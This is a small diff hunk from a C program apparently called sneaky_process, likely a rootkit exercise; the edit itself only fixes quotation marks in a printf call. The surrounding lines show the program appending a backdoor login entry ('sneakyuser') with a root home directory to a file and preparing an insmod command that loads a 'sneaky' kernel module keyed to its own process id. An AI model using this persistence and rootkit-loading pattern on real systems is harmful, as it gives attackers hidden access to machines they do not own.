@@ -13,7 +13,7 @@ int main() {
   fprintf(f, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
   fclose(f);
   pid_t mypid = getpid();
-  printf(“sneaky_process pid = %d\n”, mypid);
+  printf("sneaky_process pid = %d\n", mypid);
   char command[50] = "insmod sneaky_mod.ko mypid=";
   char cpid[10];
   sprintf(cpid, "%d", mypid);
